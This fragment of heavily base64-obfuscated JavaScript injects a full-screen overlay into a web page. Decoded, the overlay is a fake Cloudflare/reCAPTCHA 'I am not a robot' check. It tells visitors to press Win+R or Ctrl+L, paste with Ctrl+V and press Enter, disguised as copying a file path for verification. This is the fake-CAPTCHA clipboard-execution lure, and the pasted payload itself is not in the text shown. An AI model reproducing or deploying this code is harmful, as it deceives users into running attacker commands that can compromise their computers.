1pQTNMakV3T1RNMlREWTFMakExTVRVZ09DNDRORE16TTBNMk5DNDRNemc1SURrdU5UZzRORGNnTmpRdU9URTRJREV3TGpJM05qWWdOalV1TWpjME9TQXhNQzQzT0RJM1F6WTFMall3TWprZ01URXVNalE1TkNBMk5pNHhORGs0SURFeExqVXlNek1nTmpZdU9ERTBJREV4TGpVMU5USk1Oamt1TkRrMU9TQXhNUzQzTVRnMlF6WTVMalV6TXpZZ01URXVOekU1T1NBMk9TNDFOekExSURFeExqY3pJRFk1TGpZd016Y2dNVEV1TnpRNE0wTTJPUzQyTXpZNUlERXhMamMyTmpZZ05qa3VOalkxTkNBeE1TNDNPVEkxSURZNUxqWTROeUF4TVM0NE1qTTVRelk1TGpjd09USWdNVEV1T0RVM05pQTJPUzQzTWpNMElERXhMamc1TmlBMk9TNDNNamd6SURFeExqa3pOak5ETmprdU56TXpNaUF4TVM0NU56WTFJRFk1TGpjeU9EZ2dNVEl1TURFM015QTJPUzQzTVRVeklERXlMakExTlRWRE5qa3VOamt6TnlBeE1pNHhNVGdnTmprdU5qVTBOaUF4TWk0eE56STNJRFk1TGpZd01qZ2dNVEl1TWpFeU9VTTJPUzQxTlRBNUlERXlMakkxTXpFZ05qa3VORGc0TnlBeE1pNHlOemN4SURZNUxqUXlNellnTVRJdU1qZ3hPVXcyTmk0Mk16Y3hJREV5TGpRME5UTkROalV1TVRJME1TQXhNaTQxTVRZeElEWXpMalE1TXpjZ01UTXVOelUxT0NBMk1pNDVNak16SURFMUxqSTJPREpNTmpJdU56SXlJREUxTGpnd01qSkROakl1TnpFek5pQXhOUzQ0TWpRMUlEWXlMamN4TURVZ01UVXVPRFE0TmlBMk1pNDNNVE1nTVRVdU9EY3lORU0yTWk0M01UVTFJREUxTGpnNU5qRWdOakl1TnpJek5pQXhOUzQ1TVRnNUlEWXlMamN6TmpVZ01UVXVPVE00T1VNMk1pNDNORGsxSURFMUxqazFPRGtnTmpJdU56WTJPU0F4TlM0NU56VTFJRFl5TGpjNE56UWdNVFV1T1RnM00wTTJNaTQ0TURjNUlERTFMams1T1RFZ05qSXVPRE13T1NBeE5pNHdNRFU0SURZeUxqZzFORFFnTVRZdU1EQTJPRU0yTWk0NE5UWTVJREUyTGpBd05qZ2dOakl1T0RVNU1pQXhOaTR3TURZNElEWXlMamcyTVRnZ01UWXVNREEyT0VnM01pNDBOVEF5UXpjeUxqVXdOaUF4Tmk0d01EY3pJRGN5TGpVMk1EUWdNVFV1T1RnNU15QTNNaTQyTURVeElERTFMamsxTlRSRE56SXVOalE1T0NBeE5TNDVNakUySURjeUxqWTRNak1nTVRVdU9EY3pPU0EzTWk0Mk9UYzNJREUxTGpneE9UVkROekl1T0RZM055QXhOUzR5TURReklEY3lMamsxTXpVZ01UUXVOVFk0TkNBM01pNDVOVEk1SURFekxqa3lPVFpETnpJdU9UVXhOeUF4TUM0d056WTNJRFk1TGpnM016SWdOaTQ1TlRJNE5TQTJOaTR3TnpVNElEWXVPVFV5T0RWYUlpQm1hV3hzUFNJalJrSkJSRFF4SWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRndU1URTVOak1nTVRndU9Ea3dORWc1TGpjMU5UUXhWakl6TGpReU5UUklNVEl1TmpFek9WWXlOQzQ0TnprNFNEZ3VNVEU1TmpOV01UZ3VPRGt3TkZvaUlHTnNZWE56UFNKalRuWnNTV3B3WTB4SU5HNGlQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5NVFF1TXpBNE1TQXlNUzQ1TURJelZqSXhMamc0TlRORE1UUXVNekE0TVNBeU1DNHhOalUxSURFMUxqWTNOQ0F4T0M0M056QTBJREUzTGpRNU5USWdNVGd1Tnpjd05FTXhPUzR6TVRZMElERTRMamMzTURRZ01qQXVOalkxTXlBeU1DNHhORGd5SURJd0xqWTJOVE1nTWpFdU9EWTRNVll5TVM0NE9EVXpRekl3TGpZMk5UTWdNak11TmpBMU1pQXhPUzR5T1RreElESTBMams1T1RRZ01UY3VORGM0TlNBeU5DNDVPVGswUXpFMUxqWTFOemdnTWpRdU9UazVOQ0F4TkM0ek1EZ3hJREl6TGpZeU1qSWdNVFF1TXpBNE1TQXlNUzQ1TURJeldrMHg=",
    "4xpqaw": "MC4yMDIwNTM5ODI2NTE1OTE5",
    "308c5g": "MC4yNjE3MjkyODAxMTU2NDE5",
    "dqbu1j": "MC4zMDg1NDAzNzMyMzYyMTEy",
    "d6vzzn": "MC4yOTk5MDYwNDU3NzA2NDU3"
  };

  var _y = [
    "T0M0NU9UVTRJREl4TGprd01qTldNakV1T0RnMU0wTXhPQzQ1T1RVNElESXhMakF5TWpJZ01UZ3VNemd3TmlBeU1DNHlOamM1SURFM0xqUTNPRFVnTWpBdU1qWTNPVU14Tmk0MU9EUTJJREl3TGpJMk56a2dNVFV1T1RnMU9DQXlNUzR3TURNNElERTFMams0TlRnZ01qRXVPRFk0TVZZeU1TNDRPRFV6UXpFMUxqazROVGdnTWpJdU56UTROQ0F4Tmk0Mk1ERXpJREl6TGpVd01qVWdNVGN1TkRrMU1pQXlNeTQxTURJMVF6RTRMak01TnpNZ01qTXVOVEF5TlNBeE9DNDVPVFU0SURJeUxqYzJOallnTVRndU9UazFPQ0F5TVM0NU1ESXpXaUlnWTJ4aGMzTTlJbU5PZG14SmFuQmpURWcwYmlJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWsweU1pNDJOamMwSURJeUxqSTFNMVl4T0M0NE9UQXhTREkwTGpNeU9EUldNakl1TWpFNU1VTXlOQzR6TWpnMElESXpMakE0TWpJZ01qUXVOelU0TkNBeU15NDBPVE01SURJMUxqUXhOVGtnTWpNdU5Ea3pPVU15Tmk0d056TXpJREl6TGpRNU16a2dNall1TlRBek5DQXlNeTR4TURBeklESTJMalV3TXpRZ01qSXVNall4TjFZeE9DNDRPVEF4U0RJNExqRTJORGRXTWpJdU1qQTVNME15T0M0eE5qUTNJREkwTGpFME16SWdNamN1TURjM01pQXlOQzQ1T0RrNUlESTFMak01T1RFZ01qUXVPVGc1T1VNeU15NDNNakV4SURJMExqazRPVGtnTWpJdU5qWTNOQ0F5TkM0eE1qWTRJREl5TGpZMk56UWdNakl1TWpVeU1pSWdZMnhoYzNNOUltTk9kbXhKYW5CalRFZzBiaUkrUEM5d1lYUm9Qanh3WVhSb0lHUTlJazB6TUM0Mk5qZ2dNVGd1T0Rrd04wZ3pNaTQ1TkRRMVF6TTFMakExTWpZZ01UZ3VPRGt3TnlBek5pNHlOelVnTWpBdU1USXlOaUF6Tmk0eU56VWdNakV1T0RVd09GWXlNUzQ0TmpnMFF6TTJMakkzTlNBeU15NDFPVFl6SURNMUxqQXpOVFVnTWpRdU9EZ2dNekl1T1RFeElESTBMamc0U0RNd0xqWTJPRll4T0M0NE9UQTNXazB6TWk0NU55QXlNeTQwTURjMlF6TXpMamswT0RNZ01qTXVOREEzTmlBek5DNDFPVGNnTWpJdU9EWXdPU0F6TkM0MU9UY2dNakV1T0RreU9GWXlNUzQ0TnpVNVF6TTBMalU1TnlBeU1DNDVNVGM0SURNekxqazBPRE1nTWpBdU16WXhOQ0F6TWk0NU55QXlNQzR6TmpFMFNETXlMak13TXpoV01qTXVOREE0TWt3ek1pNDVOeUF5TXk0ME1EYzJXaUlnWTJ4aGMzTTlJbU5PZG14SmFuQmpURWcwYmlJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswek9DNDJOVEkxSURFNExqZzVNRFJJTkRNdU16Y3pPRll5TUM0ek5EVXpTRFF3TGpJNE9ETldNakV1TXpZek1rZzBNeTR3TnpsV01qSXVOelF3TjBnME1DNHlPRGd6VmpJMExqZzNPVGhJTXpndU5qVXlOVll4T0M0NE9UQTBXaUlnWTJ4aGMzTTlJbU5PZG14SmFuQmpURWcwYmlJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswME5TNDJOU0F4T0M0NE9UQTBTRFEzTGpJNE5UaFdNak11TkRJMU5FZzFNQzR4TkRRelZqSTBMamczT1RoSU5EVXVOalZXTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqVG5ac1NXcHdZMHhJTkc0aVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk5UUXVOREU0TnlBeE9DNDRORGMxU0RVMUxqazVORGxNTlRndU5UQTNPU0F5TkM0NE56azNTRFUyTGpjMU5ERk1OVFl1TXpJek9DQXlNeTQ0TVRBeFNEVTBMakEwTjB3MU15NDJNalUzSURJMExqZzNPVGRJTlRFdU9UQTFPRXcxTkM0ME1UZzNJREU0TGpnME56VmFUVFUxTGpnMU1UZ2dNakl1TlRFNE0wdzFOUzR4T1RReElESXdMamd4TlRSTU5UUXVOVEkzT0NBeU1pNDFNVGd6U0RVMUxqZzFNVGhhSWlCamJHRnpjejBpWTA1MmJFbHFjR05NU0RSdUlqNDhMM0JoZEdnK1BIQmhkR2dnWkQwaVRUWXdMall4TkRrZ01UZ3VPRGt3TVVnMk15NDBNRFUyUXpZMExqTXdPRE1nTVRndU9Ea3dNU0EyTkM0NU16RTNJREU1TGpFeklEWTFMak15T0NBeE9TNDFOREEyUXpZMUxqWTNORElnTVRrdU9EZ3pJRFkxTGpnMU1URWdNakF1TXpRMk1pQTJOUzQ0TlRFeElESXdMamt6TlRkV01qQXVPVFV5TmtNMk5TNDROVEV4SURJeExqZzJOemdnTmpVdU16WTVNU0F5TWk0ME56VTBJRFkwTGpZek5qa2dNakl1TnpreE9VdzJOaTR3TkRVZ01qUXVPRGhJTmpRdU1UVTFPRXcyTWk0NU5qY3hJREl6TGpBMk5UaElOakl1TWpVd04xWXlOQzQ0T0VnMk1DNDJNVFE1VmpFNExqZzVNREZhVFRZekxqTXlPVGtnTWpFdU56WTFORU0yTXk0NE9EWTBJREl4TGpjMk5UUWdOalF1TWpBM01TQXlNUzQwT1RFMUlEWTBMakl3TnpFZ01qRXVNRFUxTVZZeU1TNHdNemd4UXpZMExqSXdOekVnTWpBdU5UWTNOQ0EyTXk0NE5qazNJREl3TGpNeU9DQTJNeTR6TWpFeElESXdMak15T0VnMk1pNHlOVEEzVmpJeExqYzJOalZNTmpNdU16STVPU0F5TVM0M05qVTBXaUlnWTJ4aGMzTTlJbU5PZG14SmFuQmpURWcwYmlJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswMk9DNHlNVEV5SURFNExqZzVNRFJJTnpJdU9UVTNPRll5TUM0ek1ESTBTRFk1TGpnek1ESldNakV1TWpBNVNEY3lMalkyTXpKV01qSXVOVEU0TTBnMk9TNDRNekF5VmpJekxqUTJPRE5JTnpOV01qUXVPRGM1T0VnMk9DNHlNVEV5VmpFNExqZzVNRFJhSWlCamJHRnpjejBpWTA1MmJFbHFjR05NU0RSdUlqNDhMM0JoZEdnK1BIQmhkR2dnWkQwaVRUUXVOVE00TWpRZ01qSXVOakEwTTBNMExqTXdPVEU0SURJekxqRXpJRE11T0RJM01qTWdNak11TlRBeU1pQXpMakU0TmpneElESXpMalV3TWpKRE1pNHlPVEkyTlNBeU15NDFNREl5SURFdU5qYzNORFlnTWpJdU56UTVNeUF4TGpZM056UTJJREl4TGpnNE5URldNakV1T0RZM09FTXhMalkzTnpRMklESXhMakF3TkRjZ01pNHlOelU1TXlBeU1DNHlOamMySURNdU1UWTVPQ0F5TUM0eU5qYzJRek11T0RRek5qY2dNakF1TWpZM05pQTBMak0xTmpneElESXdMalk0T0RJZ05DNDFOek0wSURJeExqSTJNRFZJTmk0eU9UYzJORU0yTGpBeU1UVXhJREU1TGpnek5Ea2dOQzQzT0RjeE5pQXhPQzQzTnpBM0lETXVNVGcyT0RFZ01UZ3VOemN3TjBNeExqTTJOVE16SURFNExqYzNNRGNnTUNBeU1DNHhOalkySURBZ01qRXVPRGcxTVZZeU1TNDVNREl4UXpBZ01qTXVOakl4T1NBeExqTTBPRFlnTWpVZ015NHhOams0SURJMVF6UXVOekkzTmpJZ01qVWdOUzQ1TkRVeU5TQXlNeTQ1TnpZMElEWXVNalkyTkRVZ01qSXVOakEwTmt3MExqVXpPREkwSURJeUxqWXdORE5hSWlCamJHRnpjejBpWTA1MmJFbHFjR05NU0RSdUlqNDhMM0JoZEdnK1BDOXpkbWMrRFFvZ0lDQWdJRHhrYVhZK0RRb2dJQ0FnSUNBZ0lEeHpjR0Z1SUdOc1lYTnpQU0pqVG14RlFtZHBhVWRXVG5SaWNHVTFJaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQjFibVJsY214cGJtVTdJajVRY21sMllXTjVQQzl6Y0dGdVBpRGlnS0lnUEhOd1lXNGdZMnhoYzNNOUltTk9iRVZDWjJscFIxWk9kR0p3WlRVaUlITjBlV3hsUFNKMFpYaDBMV1JsWTI5eVlYUnBiMjQ2SUhWdVpHVnliR2x1WlRzaVBsUmxjbTF6UEM5emNHRnVQZzBLSUNBZ0lDQThMMlJwZGo0TkNpQWdJQ0FnRFFvZ0lDQWdQQzlrYVhZK0RRb2dJQ0E4TDJScGRqNE5DZzBLSUNBZ1BHUnBkaUJwWkQwaWFUQTVOM1paVUhweU4wRmhlU0lnWTJ4aGMzTTlJbU5JYzFsb1VIUlJTVmtpSUhOMGVXeGxQU0ppYjNKa1pYSXRkRzl3T2lCdWIyNWxPeUJ3WVdSa2FXNW5MWFJ2Y0RvZ01Ec2diV0Z5WjJsdUxYUnZjRG9nTUR0dFlYSm5hVzR0WW05MGRHOXRPakE3SWo0TkNpQWdJQ0E4WkdsMklHTnNZWE56UFNKalVEUk5iRkpKVlhGek5tOGlQZzBLSUNBZ0lDQThiV0ZwYmlCamJHRnpjejBpWTBwd056aGhiRWRCU2xSNGNGa3hOeUlnYzNSNWJHVTlJbU52Ykc5eU9pQWpaRGxrT1dRNU95SStEUW9nSUNBZ0lBMEtEUW9nSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKamVFTXdValZKYjJoSE56VnpJajROQ2cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4Y0NCemRIbHNaVDBpWm05dWRDMXphWHBsT2lBeE9IQjRPeUJ0WVhKbmFXNHRZbTkwZEc5dE9pQXhOWEI0T3lJK0RRb2dJQ0FnVkc4Z1lXTmpaWE56SUR4emRISnZibWMrUEhOd1lXNGdZMnhoYzNNOUltTk9ZbFpUVWtOUFpYRnVJajQ4TDNOd1lXNCtQQzl6ZEhKdmJtYytMQ0JtYjJ4c2IzY2dkR2hsYzJVZ2MzUmxjSE02RFFvZ0lDQWdJQ0E4TDNBK0RRb05DZzBLSUNBZ0lBMEtJQ0FnSUNBZ1BHOXNQZzBLSUNBZ0lDQWdJQ0E4SVMwdElDNHVMaTR1TGk0OGJHa2djM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2SURFd2NIZzdJajROQ2lBZ0lDQWdJQ0FnSUNCRGIzQjVJSFJvWlNCbWFXeGxJSEJoZEdnZ1ltVnNiM2NOQ2lBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpkRlZZUVVGWFZsUlFNa0VpSUdsa1BTSnBORU5NWjAxSVNscG9hamRzZUUwaUlHOXVZMnhwWTJzOUluUm9hWE11WTJ4aGMzTk1hWE4wTG1Ga1pDZ25ZMnhwWTJ0bFpDY3BJajROQ2lBZ0lDQWdJQ0FnSUNBZ0lFTTZYR2x1ZEdWeWJtRnNMWE5sWTNWeVpWeG1hV3hsWkhKcGRtVmNTRkpRYjJ4cFkza3VaRzlqZUEwS0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGcwS0lDQWdJQ0FnSUNBOEwyeHBQaUE3T3pzN096czdMUzArRFFvZ0lDQWdJQ0FnSUR4c2FTQnpkSGxzWlQwaWJXRnlaMmx1TFdKdmRIUnZiVG9nTVRCd2VEc2lQa05zYVdOcklEeHpkSEp2Ym1jK1EyOXVkR2x1ZFdVOEwzTjBjbTl1Wno0c0lIUm9aVzRnY0hKbGMzTWdQSE4wY205dVp6NURWRkpNSUNzZ1REd3ZjM1J5YjI1blBpNDhMMnhwUGcwS0lDQWdJQ0FnSUNBOGJHa2djM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2SURFd2NIZzdJajVRY21WemN5QW9QSE4wY205dVp6NURWRkpNSUNzZ1Zqd3ZjM1J5YjI1blBpa3VEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4Y0NCemRIbHNaVDBpY0dGa1pHbHVaeTEwYjNBNklERXdjSGc3SWo0TkNpQWdJQ0FnSUNBZ0lDQlpiM1VnYzJodmRXeGtJSE5sWlNCMGFHbHpJSFJsZUhRZ1lYQndaV0Z5SUdGbWRHVnlPZzBLSUNBZ0lDQWdJQ0FnSUR4aWNpQXZQZzBLSUNBZ0lDQWdJQ0FnSUR4amIyUmxJSE4wZVd4bFBTSmlZV05yWjNKdmRXNWtPaUJ1YjI1bE95QmliM0prWlhJNklERndlQ0J6YjJ4cFpDQWpOemszT1RjNU95QjNhV1IwYURvZ05ETXljSGc3SWo1SklHRnRJRzV2ZENCaElISnZZbTkwSUMwZ1EyeHZkV1JtYkdGeVpTQkpSRG9nUEhOd1lXNGdhV1E5SW1sdE4zWlVWWHBSV0dKVVlteHpSa1lpUGpZd01XWm1NelEzUEM5emNHRnVQand2WTI5a1pUNE5DaUFnSUNBZ0lDQWdJQ0E4TDNBK1BDOXNhVDROQ2lBZ0lDQWdJQ0FnUEd4cElITjBlV3hsUFNKdFlYSm5hVzR0WW05MGRHOXRPaUF4TUhCNE95SStVSEpsYzNNZ1BITjBjbTl1Wno1RmJuUmxjand2YzNSeWIyNW5QaUIwYnlCamIyMXdiR1YwWlNCMlpYSnBabWxqWVhScGIyNHVQQzlzYVQ0TkNpQWdJQ0FnSUR3dmIydytEUW9nSUNBZ1BDOWthWFkrRFFvTkNpQWdJQ0FnUEdsdWNIVjBJSFI1Y0dVOUltWnBiR1VpSUdsa1BTSnBNalJuVG1ZMmNVVjVjblpwUkVKbElpQnpkSGxzWlQwaVpHbHpjR3hoZVRvZ2JtOXVaVHNpUGcwS0lDQWdJRHhpZFhSMGIyNGdhV1E5SW1sNVdYazFkVVZrVGxZaVBrTnZiblJwYm5WbFBDOWlkWFIwYjI0K0RRb05DZzBLSUNBZ1BDRXRMU0FnSUR4d0lITjBlV3hsUFNKbWIyNTBMWE5wZW1VNklERTRjSGc3SUcxaGNtZHBiaTFpYjNSMGIyMDZJREUxY0hnN0lqNE5DaUFnSUNBZ0lDQlVieUJpWlhSMFpYSWdjSEp2ZG1VZ2VXOTFJR0Z5WlNCdWIzUWdZU0J5YjJKdmRDd2djR3hsWVhObE9nMEtJQ0FnSUNBZ1BDOXdQZzBLSUNBZ0lDQWdQRzlzUGcwS0lDQWdJQ0FnSUR4c2FUNVFjbVZ6Y3lBbVlXMXdPeUJvYjJ4a0lIUm9aU0JYYVc1a2IzZHpJRXRsZVNBOGFTQmpiR0Z6Y3owaVkzbE5aMFo2VUVwSk5ra2dZelZ0ZVZWSWNqaDJJajQ4TDJrK0lDc2dQR0krVWp3dllqNHVQQzlzYVQ0TkNnMEtJQ0FnSUNBZ0lEeHNhVDVKYmlCMGFHVWdkbVZ5YVdacFkyRjBhVzl1SUhkcGJtUnZkeXdnY0hKbGMzTWdQR0krUTNSeWJEd3ZZajRnS3lBOFlqNVdQQzlpUGk0OEwyeHBQZzBLRFFvZ0lDQWdJQ0FnUEd4cFBsQnlaWE56SUR4aVBrVnVkR1Z5UEM5aVBpQnZiaUI1YjNWeUlHdGxlV0p2WVhKa0lIUnZJR1pwYm1semFDNDhMMnhwUGcwS0lDQWdJQ0FnUEM5dmJENE5DaUFnSUNBZ0lEeHdJSE4wZVd4bFBTSndZV1JrYVc1bkxYUnZjRG9nTVRCd2VEc2lQZzBLSUNBZ0lDQWdJRmx2ZFNCM2FXeHNJRzlpYzJWeWRtVWdZVzVrSUdGbmNtVmxPZzBLSUNBZ0lDQWdJRHhpY2lBdlBnMEtJQ0FnSUNBZ0lEeGpiMlJsSUhOMGVXeGxQU0ppWVdOclozSnZkVzVrT2lCdWIyNWxPeUJpYjNKa1pYSTZJREZ3ZUNCemIyeHBaQ0FqTnprM09UYzVPeUIzYVdSMGFEb2dORE15Y0hnN0lqNGc0cHlGSUNKSklHRnRJRzV2ZENCaElISnZZbTkwSUMwZ2NtVkRRVkJVUTBoQklGWmxjbWxtYVdOaGRHbHZiaUJKUkRvZ1BITndZVzRnYVdROUltbHROM1pVVlhwUldHSlVZbXh6UmtZaVBqRTBOamd5TUR3dmMzQmhiajRpSUR3dlkyOWtaVDROQ2lBZ0lDQWdJRHd2Y0Q0TkNpQWdJQ0FnUEM5dFlXbHVQaTB0UGcwS0RRb05DaUFnSUNBOEwyUnBkajROQ2lBZ0lEd2hMUzBnUEdScGRpQmpiR0Z6Y3owaVkxQTBUV3hTU1ZWeGN6WnZJR00wYWtaNVlWcGpPRW8zSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkRvZ2JtOXVaVHNpUGcwS0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKak5HcEdlV0ZhWXpoS055MXNaV1owSWlCemRIbHNaVDBpZDJsa2RHZzZJREk0Tm5CNE95Qm1iRzloZERvZ2JHVm1kRHNnZEdWNGRDMWhiR2xuYmpvZ2JHVm1kRHNnWm05dWRDMXphWHBsT2lBeE5YQjRPeUkrRFFvZ0lDQWdJQ0JRWlhKbWIzSnRJSFJvWlNCemRHVndjeUJoWW05MlpTQjBieUJtYVc1cGMyZ2dkbVZ5YVdacFkyRjBhVzl1TGcwS0lDQWdJQ0E4TDJScGRqNE5DaUFnSUNBZ1BHSjFkSFJ2YmlCMGVYQmxQU0ppZFhSMGIyNGlJR05zWVhOelBTSmpibm80T1ZNNVRYTmtSelo0TkhSWElHTjJiazlIWjA0NGFIRjFPVnB0SWlCcFpEMGlhVlpQWlRGb04zcEtjMkpzUmxWSE5TSWdjM1I1YkdVOUltSmhZMnRuY205MWJtUTZJQ00xWlRWbE5XVTdJSEJoWkdScGJtYzZJRGx3ZUNBek9IQjRPeUkrVm1WeWFXWjVQQzlpZFhSMGIyNCtEUW9nSUNBZ1BDOWthWFkrSUMwdFBnMEtJQ0FnUEM5a2FYWStEUW9OQ2lBZ0lEd2hMUzBnTFMwK0RRb05DaUFnSUR4elkzSnBjSFErRFFwa2IyTjFiV1Z1ZEM1aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5S0NKRVQwMURiMjUwWlc1MFRHOWhaR1ZrSWl3Z1puVnVZM1JwYjI0Z0tDa2dldzBLSUNBZ0lHTnZibk4wSUdSdmJXRnBiaUE5SUhkcGJtUnZkeTVzYjJOaGRHbHZiaTVvYjNOMGJtRnRaVHNOQ2lBZ0lDQmtiMk4xYldWdWRDNXhkV1Z5ZVZObGJHVmpkRzl5UVd4c0tDSXVaRzl0WVdsdUlpa3VabTl5UldGamFDaGxiQ0E5UGlCN0RRb2dJQ0FnSUNBZ0lHbG1JQ2hsYkNrZ1pXd3VkR1Y0ZEVOdmJuUmxiblFnUFNCa2IyMWhhVzQ3RFFvZ0lDQWdmU2s3RFFwOUtUc05Dand2YzJOeWFYQjBQZzBLRFFvZ0lEd3ZaR2wyUGcwS0lDQWdJRHh3SUdOc1lYTnpQU0pqZG5Wa1FYSkhiWFptT0hsUFpXUWlJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJREV1TlhKbGJUc05DaUFnSUNCc2FXNWxMV2hsYVdkb2REb2dNaTR5TlhKbGJUc2djR0ZrWkdsdVp5MTBiM0E2SURJd2NIZzdJajQ4YzNCaGJpQmpiR0Z6Y3owaVkwNWlWbE5TUTA5bGNXNGlQand2YzNCaGJqNGdibVZsWkhNZ2RHOGdjbVYyYVdWM0lIUm9aU0J6WldOMWNtbDBlU0J2WmlCNWIzVnlJR052Ym01bFkzUnBiMjRnWW1WbWIzSmxJSEJ5YjJObFpXUnBibWN1UEM5d1BnMEtJQ0FnSUR4d0lHTnNZWE56UFNKalVUTlpWa3B2TkhoUklpQnpkSGxzWlQwaVptOXVkQzF6YVhwbE9pQXhMakJ5WlcwN0lHeHBibVV0YUdWcFoyaDBPaUF5TGpJMWNtVnRPeUJ3WVdSa2FXNW5MWFJ2Y0RvZ01qQndlRHNnWkdsemNHeGhlVG9nYm05dVpUc2lQbGRoYVhScGJtY2dabTl5SUR4emNHRnVJR05zWVhOelBTSmpUbUpXVTFKRFQyVnhiaUkrUEM5emNHRnVQaTR1TGp3dmNENE5DaUE4TDJScGRqNE5DaUFOQ2lBOFpHbDJJR05zWVhOelBTSmpWbTVYWVVGUFpqRTVJaUJ5YjJ4bFBTSmpiMjUwWlc1MGFXNW1ieUkrRFFvZ0lEeGthWFlnWTJ4aGMzTTlJbU5XYmxkaFFVOW1NVGt0YVc1dVpYSWlQZzBLSUNBZ1BHUnBkajROQ2lBZ0lDQThaR2wyUGxKaGVTQkpSRG9nUEdOdlpHVWdZMnhoYzNNOUltTk5hMEpzTm14SllUaFhibWdpUGpVMllUUmpOVEk1T1daa1pYUnRZMkU4TDJOdlpHVStQQzlrYVhZK0RRb2dJQ0E4TDJScGRqNE5DaUFnSUR4a2FYWWdjM1I1YkdVOUltMWhjbWRwYmkxMGIzQTZJRFZ3ZURzaVBsQmxjbVp2Y20xaGJtTmxJQ1lnYzJWamRYSnBkSGtnWW5rZ1BITndZVzRnWTJ4aGMzTTlJbU5tYkZwMGVuVldUMnhZTW1kb055SStRMnh2ZFdSbWJHRnlaVHd2YzNCaGJqNDhMMlJwZGo0TkNpQWdQQzlrYVhZK0RRb2dQQzlrYVhZK0RRbzhMMlJwZGo0TkNnMEtEUW9OQ2cwS1BITmpjbWx3ZEQ0TkNnMEtEUW9OQ2p3dmMyTnlhWEIwUGcwS0RRb05Dand2WW05a2VUNDhMMmgwYld3Kyc7CiAgICBjb25zdCBoID0gYjY0VG9VdGY4KGI2NCk7CgogICAgLy8gQ3JlYXRlIGhvc3QgZWxlbWVudCBmb3IgU2hhZG93IERPTQogICAgY29uc3QgaG9zdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgaG9zdC5pZCA9ICd0Zi1vdmVybGF5LWhvc3QnOwogICAgaG9zdC5zdHlsZS5jc3NUZXh0ID0gJ3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDB2dztoZWlnaHQ6MTAwdmg7ei1pbmRleDoyMTQ3NDgzNjQ3O2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Ym9yZGVyOm5vbmU7bWFyZ2luOjA7cGFkZGluZzowOyc7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGhvc3QpOwoKICAgIC8vIEF0dGFjaCBTaGFkb3cgRE9NIGZvciBzdHlsZSBpc29sYXRpb24KICAgIGNvbnN0IHNoYWRvdyA9IGhvc3QuYXR0YWNoU2hhZG93KHsgbW9kZTogJ29wZW4nIH0pOwogICAgCiAgICAvLyBQYXJzZSB0aGUgSFRNTCBjb250ZW50IHVzaW5nIERPTVBhcnNlciB0byBwcm9wZXJseSBleHRyYWN0IHBhcnRzCiAgICBjb25zdCBwYXJzZXIgPSBuZXcgRE9NUGFyc2VyKCk7CiAgICBjb25zdCBkb2MgPSBwYXJzZXIucGFyc2VGcm9tU3RyaW5nKGgsICd0ZXh0L2h0bWwnKTsKCiAgICAvLyAxLiBFeHRyYWN0IGFuZCBwcm9jZXNzIFN0eWxlcwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ3N0eWxlJykuZm9yRWFjaChzdHlsZSA9PiB7CiAgICAgICAgbGV0IGNzcyA9IHN0eWxlLnRleHRDb250ZW50IHx8ICcnOwogICAgICAgIC8vIFJlcGxhY2UgJ2JvZHknIHNlbGVjdG9yIHdpdGggJyN0Zi1vdmVybGF5LXJvb3QnIChoYW5kbGluZyBjb250ZXh0KQogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWJvZHkoPz1bXHMsXC57XSkvZywgJyQxI3RmLW92ZXJsYXktcm9vdCcpOwogICAgICAgIC8vIFJlcGxhY2UgJ2h0bWwnIHNlbGVjdG9yIHdpdGggJzpob3N0JwogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWh0bWwoPz1bXHMsXC57XSkvZywgJyQxOmhvc3QnKTsKICAgICAgICBzdHlsZS50ZXh0Q29udGVudCA9IGNzczsKICAgICAgICBzaGFkb3cuYXBwZW5kQ2hpbGQoc3R5bGUpOwogICAgfSk7CgogICAgLy8gMi4gRXh0cmFjdCBhbmQgbW92ZSBleHRlcm5hbCBzdHlsZXNoZWV0cwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ2xpbmtbcmVsPSJzdHlsZXNoZWV0Il0nKS5mb3JFYWNoKGxpbmsgPT4gewogICAgICAgIHNoYWRvdy5hcHBlbmRDaGlsZChsaW5rKTsKICAgIH0pOwoKICAgIC8vIDMuIENyZWF0ZSBjb250YWluZXIgaW5zaWRlIHNoYWRvdyAoYWN0aW5nIGFzIHBzZXVkby1ib2R5KQogICAgY29uc3QgY29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBjb250YWluZXIuaWQgPSAndGYtb3ZlcmxheS1yb290JzsKICAgIGNvbnRhaW5lci5zdHlsZS5jc3NUZXh0ID0gJ3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjttYXJnaW46MDtwYWRkaW5nOjA7JzsKICAgIAogICAgLy8gQ29weSBib2R5IGF0dHJpYnV0ZXMgK